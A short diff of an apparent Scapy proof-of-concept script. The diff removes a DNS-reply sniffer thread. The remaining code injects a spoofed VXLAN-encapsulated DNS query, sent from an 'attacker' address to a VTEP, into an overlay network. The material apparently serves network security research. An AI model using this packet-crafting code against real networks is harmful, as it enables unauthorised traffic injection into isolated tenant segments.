@@ -22,17 +22,5 @@ insideport=53
 testport=50408
 lookup = sys.argv[1]
 
-
-
-#GET Response Function
-def sniff_dns_thread(testport):
-    sniff(filter = "udp and port " + str(testport), count = 1, prn= lambda x:x.summary(),timeout=5)
-    return
-
-#start sniff thread and sleep shortly for the thread to come up
-sniffer_thread = threading.Thread(target=sniff_dns_thread, args=(testport,))
-sniffer_thread.start()
-time.sleep(0.5)
-
 # sned dns request
 send(IP(src=attacker,dst=vtep)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=(1),flags="Instance")/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,dst=destination)/UDP(sport=testport,dport=53)/DNS(rd=1,qd=DNSQR(qname=str(lookup),qtype="A")))
